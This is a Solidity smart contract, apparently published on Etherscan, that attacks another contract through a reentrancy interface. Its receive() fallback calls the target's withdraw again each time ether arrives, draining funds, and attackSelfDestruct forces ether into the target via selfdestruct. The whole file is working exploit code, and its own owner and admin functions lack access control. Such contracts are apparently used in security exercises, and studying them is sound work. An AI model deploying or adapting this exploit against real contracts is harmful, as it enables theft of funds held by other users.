/**
 *Submitted for verification at Etherscan.io on 2022-09-01
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.7.6;

interface IReentrant {
   function withdraw(uint _amount) external;
   function donate(address _to) external payable;
}

contract RepeatWithdraw {

    address public otherContract;
    address public owner;
    uint256 public valor = 20;
    bool public flag = false;

    constructor(address _otherContract) {                
        otherContract = _otherContract;
        owner = msg.sender;
    }

    function setFlag() external {
        if (flag) {
            flag = false;
        } else {
            flag = true;
        }
    }

    function setOtherContract(address _otherContract) external {
        otherContract = _otherContract;
    }

    function changeOwner(address _owner) external {
        owner = _owner;
    }
    
    function attackSelfDestruct() public payable {
        // call attack and send ether
        // cast address to payable
        address payable addr = payable(address(otherContract));
        selfdestruct(addr);
    }

    function justSelfDestruct() external {
        selfdestruct(msg.sender);
    }

    function transferToContractByCall(uint256 _value) external {
        address payable receiver = payable(otherContract);        
        
        (bool sent, ) = receiver.call{value: _value}("");
        require(sent, "Failed to send Ether");
    }

    function callDonate(address _to, uint256 _amount) external {
        IReentrant reentrantContract = IReentrant(otherContract);
        reentrantContract.donate{ value: _amount }(_to);        
    }

    function callWithdraw(uint256 _amount) external {
        IReentrant reentrantContract = IReentrant(otherContract);
        reentrantContract.withdraw(_amount);        
    }

    receive() external payable {   
        if (flag) {
            IReentrant reentrantContract = IReentrant(otherContract);
            reentrantContract.withdraw(msg.value);
        }
    }
}